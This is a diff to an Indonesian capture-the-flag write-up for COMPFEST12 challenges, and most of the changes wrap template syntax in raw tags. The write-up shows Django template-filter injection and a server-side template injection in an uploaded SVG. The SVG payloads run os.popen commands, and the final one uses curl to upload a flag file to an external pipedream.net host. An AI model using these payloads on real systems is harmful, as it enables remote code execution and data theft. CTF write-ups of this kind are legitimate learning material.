@@ -1262,7 +1262,7 @@ $flag = 'COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}';
 
 ## 7. Super Secure Filter [280pts]
 
-Input asal untuk mentriger error `\{\{ 4 \}\}` untuk mengecek apakah debug dihidupkan. Dan ternyata benar debug hidup.
+Input asal untuk mentriger error `{%raw%}{{ 4 }}{%endraw%}` untuk mengecek apakah debug dihidupkan. Dan ternyata benar debug hidup.
 
 Error dibagian `/code/myapp/views.py in homepage` terdapat sesuatu yang mencurigakan, yaitu terdapat request context `arthropods` yang memiliki `other`.
 
@@ -1279,7 +1279,7 @@ Dan terdapat filter `safe` yang kurang baik.
 data = request.POST.get('data', '')
 a = angkabukan(''.join(data.split()[1:-1]))
 ...
-template = Template(TEMP.format( "{{ " + data.split()[1].replace('mammals', 'mammals|safe').replace('pisces', 'pisces|safe').replace('amfibi', 'amfibi|safe') + "|safe }}" + a))
+template = Template(TEMP.format( "{%raw%}{{ " + data.split()[1].replace('mammals', 'mammals|safe').replace('pisces', 'pisces|safe').replace('amfibi', 'amfibi|safe') + "|safe }}{%endraw%}" + a))
 ```
 
 Didapatkan juga fungsi-fungsi yang mempermudah untuk mendapatkan flag, yaitu error pada `/code/myapp/templatetags/myfilters.py`.
@@ -1299,7 +1299,7 @@ def cobacek(a):
         a = int(a)
         assert a>0,"woi masa negatif ah yang bener dong"
         assert a<4,"woi udah dibilang jangan lebih dari 3" …
-        temp = ['{{ mammals|safe }}', '{{ pisces|safe }}','{{ amfibi|safe }}']
+        temp = ['{%raw%}{{ mammals|safe }}{%endraw%}', '{%raw%}{{ pisces|safe }}{%endraw%}','{%raw%}{{ amfibi|safe }}{%endraw%}']
         lst = sample(temp, a)
         return ''.join(lst)
     except ValueError:
@@ -1307,13 +1307,13 @@ def cobacek(a):
     ...
 ```
 
-Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{{{{ arthropods|isinya }}}}`, akan mendapatkan list dir dari `arthropods`.
+Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{%raw%}{{ arthropods|isinya }}{%endraw%}`, akan mendapatkan list dir dari `arthropods`.
 
 ```py
 ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']arthropods|isinya
 ```
 
-Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`. Payload akhir: `{{{{ arthropods|ambildong:"__doc__" }}}}`
+Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`. Payload akhir: `{%raw%}{{ arthropods|ambildong:"__doc__" }}{%endraw%}`
 
 ```py
 COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}
@@ -1336,7 +1336,7 @@ image None
 ..[snip]..
 ```
 
-Template Injection, dengan menambahkan `{{{{ 2*2 }}}}` pada svg file.
+Template Injection, dengan menambahkan {%raw%}{{ 2\*2 }}{%endraw%}` pada svg file.
 
 ```html
 ..[snip]..
@@ -1348,7 +1348,7 @@ Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os modul
 
 ```py
 <svg>
-    <image>\{\{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() \}\}</image>
+    <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}{%endraw%}</image>
 </svg>
 ```
 
@@ -1392,7 +1392,7 @@ Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payl
 
 ```py
 <svg>
-    <image>{{{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}}}</image>
+    <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}{%endraw%}</image>
 </svg>
 ```
 
